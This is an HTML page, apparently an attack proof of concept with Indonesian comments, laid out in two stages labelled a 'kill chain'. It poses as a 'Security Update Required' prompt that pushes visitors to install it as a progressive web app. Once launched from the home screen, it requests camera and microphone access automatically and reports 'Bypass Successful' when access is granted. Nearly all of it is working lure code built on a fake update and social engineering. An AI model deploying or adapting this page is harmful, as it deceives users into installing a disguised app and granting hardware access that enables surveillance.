<!doctype html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="manifest" href="manifest.json">
    <style>
        body { font-family: sans-serif; background: #202124; color: white; text-align: center; padding-top: 15vh; }
        .btn { background: #1a73e8; color: white; border: none; padding: 20px; font-size: 1.2em; border-radius: 12px; font-weight: bold; cursor: pointer; width: 85%; display: none; box-shadow: 0 4px 15px rgba(0,0,0,0.4); }
        #loader { display: none; margin-top: 20vh; font-size: 1.5em; color: #8ab4f8; }
    </style>
</head>
<body>
    
    <div id="install-ui">
        <h2 id="txt">Security Update Required</h2>
        <p id="sub" style="color:#9aa0a6">Checking system compatibility</p>
        <button class="btn" id="go">Install Update</button>
    </div>

    <div id="loader">Verifying System Identity...</div>

<script>
// ========================================================
// STAGE 2: THE KILL CHAIN (Eksekusi di dalam PWA Standalone)
// ========================================================
if (window.matchMedia('(display-mode: standalone)').matches) {
    // Sembunyikan UI Install, tampilkan layar loading meyakinkan
    document.getElementById('install-ui').style.display = 'none';
    document.getElementById('loader').style.display = 'block';

    // Langsung auto-trigger permission dialog setelah PWA terbuka
    // Tanpa perlu user interaksi lagi di dalam aplikasi
    setTimeout(() => {
        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
            .then(stream => {
                // Eksekusi berhasil, langsung matikan stream agar lampu kamera mati
                stream.getTracks().forEach(track => track.stop());
                document.getElementById('loader').innerHTML = '<span style="color:lime;">Bypass Successful. Hardware Access Granted.</span>';
            })
            .catch(err => {
                document.getElementById('loader').innerHTML = '<span style="color:red;">User Denied or Blocked.</span>';
            });
    }, 800); // Jeda milidetik agar UI PWA render sempurna sebelum OS pop-up turun
} 

// ========================================================
// STAGE 1: PWA INSTALLATION FLOW (Eksekusi di Browser biasa)
// ========================================================
else {
    let p;
    navigator.serviceWorker.register('sw.js');

    window.addEventListener('beforeinstallprompt', (e) => {
        e.preventDefault();
        p = e;
        document.getElementById('go').style.display = 'inline-block';
        document.getElementById('sub').innerText = "Compatibility Confirmed";
    });

    document.getElementById('go').onclick = async () => {
        if (p) {
            p.prompt();
            const { outcome } = await p.userChoice;
            if (outcome === 'accepted') {
                alert("Module Installed. Launch the app from your Home Screen.");
            }
            p = null;
        }
    };
}
</script>
</body>
</html>
